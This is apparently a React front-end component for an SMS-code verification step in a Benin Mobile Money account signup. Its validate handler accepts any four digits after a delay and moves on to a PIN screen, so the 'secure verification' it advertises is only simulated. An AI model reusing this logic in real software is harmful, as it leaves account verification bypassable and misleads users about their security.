import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function Verification() {
  const navigate = useNavigate();
  const [code, setCode] = useState(["", "", "", ""]);
  const [timer, setTimer] = useState(59);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const inscription = JSON.parse(localStorage.getItem("inscription") || "{}");
  const tel = inscription.telephone || "XX XX XX XX";

  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => setTimer((p) => p - 1), 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const handleKey = (key) => {
    if (key === "DEL") {
      setCode((prev) => {
        const newCode = [...prev];
        for (let i = newCode.length - 1; i >= 0; i--) {
          if (newCode[i] !== "") {
            newCode[i] = "";
            break;
          }
        }
        return newCode;
      });
      setError("");
      return;
    }

    setCode((prev) => {
      const firstEmpty = prev.findIndex((c) => c === "");
      if (firstEmpty === -1) return prev;
      const newCode = [...prev];
      newCode[firstEmpty] = key;
      return newCode;
    });
    setError("");
  };

  const handleValidate = () => {
    const fullCode = code.join("");
    if (fullCode.length < 4) {
      setError("Veuillez entrer le code complet");
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate("/code-pin");
    }, 1500);
  };

  const handleResend = () => {
    if (timer > 0) return;
    setTimer(59);
    setCode(["", "", "", ""]);
    setError("");
  };

  const isComplete = code.every((c) => c !== "");

  const keys = [
    { label: "1", value: "1" },
    { label: "2", value: "2" },
    { label: "3", value: "3" },
    { label: "4", value: "4" },
    { label: "5", value: "5" },
    { label: "6", value: "6" },
    { label: "7", value: "7" },
    { label: "8", value: "8" },
    { label: "9", value: "9" },
    { label: "", value: "" },
    { label: "0", value: "0" },
    { label: "⌫", value: "DEL" },
  ];

  return (
    // translate="no" empêche les extensions de traduction de modifier le DOM
    <div
      className="min-h-screen bg-gray-100 flex items-start justify-center md:py-8"
      translate="no"
    >
      <div className="w-full max-w-md bg-white min-h-screen md:min-h-0 md:rounded-3xl md:shadow-2xl overflow-hidden flex flex-col">

        {/* Header */}
        <div className="flex items-center px-6 pt-8 pb-4">
          <button
            onClick={() => navigate(-1)}
            className="w-9 h-9 rounded-full bg-gray-100 flex items-center justify-center"
          >
            <span className="text-gray-600 text-lg">←</span>
          </button>
        </div>

        <div className="flex-1 flex flex-col px-6 pt-2">

          {/* Titre */}
          <div className="mb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-1">
              Créer mon compte
            </h1>
            <div className="flex justify-between items-center mb-2 mt-4">
              <span className="text-xs font-bold text-green-700 uppercase tracking-wide">
                Étape 2 sur 3
              </span>
              <span className="text-xs text-gray-400">Vérifiez votre numéro</span>
            </div>
            <div className="flex gap-1">
              <div className="h-1.5 flex-1 rounded-full bg-green-700" />
              <div className="h-1.5 flex-1 rounded-full bg-green-700" />
              <div className="h-1.5 flex-1 rounded-full bg-gray-200" />
            </div>
          </div>

          {/* Message SMS */}
          <p className="text-gray-600 text-sm mb-8 leading-relaxed">
            Nous avons envoyé un code SMS au{" "}
            <span className="font-bold text-gray-900">+229 {tel}</span>
          </p>

          {/* Cases code
              suppressHydrationWarning évite les conflits de réconciliation DOM
              Les cases sont de simples divs sans aucun input */}
          <div
            className="flex justify-center gap-4 mb-4"
            suppressHydrationWarning
          >
            {code.map((digit, i) => (
              <div
                key={i}
                suppressHydrationWarning
                className={`w-16 h-16 rounded-2xl flex items-center justify-center border-2 transition-all select-none ${
                  digit
                    ? "border-green-700 bg-green-50"
                    : "border-gray-200 bg-gray-50"
                }`}
              >
                <div
                  suppressHydrationWarning
                  className={`w-3 h-3 rounded-full transition-all ${
                    digit ? "bg-green-700 scale-110" : "bg-gray-300"
                  }`}
                />
              </div>
            ))}
          </div>

          {/* Erreur */}
          {error && (
            <p className="text-red-400 text-xs text-center mb-4">{error}</p>
          )}

          {/* Timer */}
          <div className="flex justify-center mb-6">
            {timer > 0 ? (
              <p className="text-gray-400 text-sm">
                ⏱ Renvoyer le code dans {timer}s
              </p>
            ) : (
              <button
                onClick={handleResend}
                className="text-green-700 font-semibold text-sm"
              >
                Renvoyer le code
              </button>
            )}
          </div>

          {/* Badge sécurité */}
          <div className="flex items-center gap-3 bg-gray-50 rounded-2xl p-4 mb-6">
            <div className="flex gap-1" suppressHydrationWarning>
              <div className="w-8 h-8 rounded-lg bg-yellow-400 flex items-center justify-center text-xs font-bold text-white">
                M
              </div>
              <div className="w-8 h-8 rounded-lg bg-blue-500 flex items-center justify-center text-xs font-bold text-white">
                V
              </div>
            </div>
            <p className="text-xs text-gray-500 flex-1">
              Vérification sécurisée via nos partenaires Mobile Money officiels au Bénin.
            </p>
          </div>

          {/* Bouton valider */}
          <button
            type="button"
            onClick={handleValidate}
            disabled={loading || !isComplete}
            className={`w-full py-4 rounded-2xl font-semibold text-white text-base flex items-center justify-center gap-2 transition-all mb-2 ${
              !isComplete || loading ? "opacity-50 cursor-not-allowed" : "active:scale-95"
            }`}
            style={{ backgroundColor: "#1B5E4B" }}
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
            ) : (
              <span>Valider →</span>
            )}
          </button>
        </div>

        {/* Clavier numérique
            Utilise des boutons simples sans aucun input
            type="button" empêche tout comportement de formulaire */}
        <div className="px-6 pb-8 mt-2" translate="no">
          <div className="grid grid-cols-3 gap-3">
            {keys.map((key, i) => {
              if (key.value === "") {
                return <div key={i} />;
              }
              return (
                <button
                  key={i}
                  type="button"
                  onClick={() => handleKey(key.value)}
                  className={`h-14 rounded-2xl flex items-center justify-center text-xl font-semibold transition-all select-none active:scale-90 ${
                    key.value === "DEL"
                      ? "bg-gray-100 text-gray-600 active:bg-gray-200"
                      : "bg-gray-100 text-gray-800 active:bg-gray-200"
                  }`}
                >
                  {key.label}
                </button>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}